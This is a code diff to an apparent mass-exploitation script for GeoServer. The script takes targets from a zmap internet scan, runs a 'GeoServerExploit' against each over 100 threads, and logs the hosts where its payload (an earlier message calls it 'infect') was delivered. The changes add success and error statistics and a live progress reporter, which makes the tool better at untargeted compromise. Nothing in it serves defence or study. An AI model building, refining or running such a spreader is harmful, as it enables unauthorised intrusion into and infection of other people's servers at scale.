@@ -4,12 +4,22 @@ import xml.etree.ElementTree as ET
 import click
 import concurrent.futures
 import urllib3
-from threading import Lock
+from threading import Lock, Event, Thread
+import time
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Lock for thread-safe file writing
+# Locks and sync primitives for thread-safe operations
 file_lock = Lock()
+stats_lock = Lock()
+stop_reporting = Event()
+
+stats = {
+    "processed": 0,
+    "success": 0,
+    "errors": 0,
+    "not_vulnerable": 0,
+}
 
 class GeoServerExploit:
     def __init__(self, url: str):
@@ -86,15 +96,58 @@ def log_successful_url(url):
             file.write(url + "\n")
 
 
+def record_stats(url, success, error):
+    with stats_lock:
+        stats["processed"] += 1
+        if success:
+            stats["success"] += 1
+        elif error:
+            stats["errors"] += 1
+        else:
+            stats["not_vulnerable"] += 1
+
+        processed = stats["processed"]
+        success_count = stats["success"]
+        error_count = stats["errors"]
+        not_vuln = stats["not_vulnerable"]
+
+    if success:
+        print(f"[+] Success: {url}")
+    elif error:
+        error_text = str(error)
+        print(f"[!] Error: {url} -> {error_text}")
+
+def snapshot_stats():
+    with stats_lock:
+        return (
+            stats["processed"],
+            stats["success"],
+            stats["errors"],
+            stats["not_vulnerable"],
+        )
+
+
+def stats_reporter(stop_event):
+    while not stop_event.is_set():
+        time.sleep(1)
+        processed, success_count, error_count, not_vuln = snapshot_stats()
+        if processed == 0:
+            continue
+        print(f"[stats] processed={processed} success={success_count} errors={error_count} no_vuln={not_vuln}")
+
+
 def process_url(url):
     if not url.startswith("http://") and not url.startswith("https://"):
         url = "http://" + url
-    print(f"Running exploit on {url} with payload: infect")
     exploit = GeoServerExploit(url)
-    exploit.run()
-    if exploit.payload_delivered:
-        print(f"Successfully exploited {url}.")
-        log_successful_url(url)
+    try:
+        exploit.run()
+        if exploit.payload_delivered:
+            log_successful_url(url)
+            return url, True, None
+        return url, False, None
+    except Exception as exc:
+        return url, False, exc
 
 @click.command()
 @click.option("-w", "--workers", default=100, help="Number of worker threads")
@@ -103,16 +156,25 @@ def main(workers):
     if stdin_stream.isatty():
         raise click.UsageError("Provide addresses via stdin, e.g.: zmap ... | python x86.py -w 100")
 
-    futures = {}
+    with stats_lock:
+        for key in stats:
+            stats[key] = 0
+
+    stop_reporting.clear()
+    reporter_thread = Thread(target=stats_reporter, args=(stop_reporting,), daemon=True)
+    reporter_thread.start()
+
+    futures = set()
+
+    def handle_future(future):
+        futures.discard(future)
+        url, success, error = future.result()
+        record_stats(url, success, error)
 
     def drain_completed():
         completed = [future for future in list(futures) if future.done()]
         for future in completed:
-            url = futures.pop(future)
-            try:
-                future.result()
-            except Exception as e:
-                print(f"Error processing {url}: {e}")
+            handle_future(future)
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
         for line in stdin_stream:
@@ -120,15 +182,17 @@ def main(workers):
             if not url:
                 continue
             future = executor.submit(process_url, url)
-            futures[future] = url
+            futures.add(future)
             drain_completed()
 
         for future in concurrent.futures.as_completed(list(futures)):
-            url = futures.pop(future)
-            try:
-                future.result()
-            except Exception as e:
-                print(f"Error processing {url}: {e}")
+            handle_future(future)
+
+    stop_reporting.set()
+    reporter_thread.join()
+
+    processed, success_count, error_count, not_vuln = snapshot_stats()
+    print(f"[summary] Processed: {processed} | success: {success_count} | errors: {error_count} | no_vuln: {not_vuln}")
 
 if __name__ == "__main__":
     main()
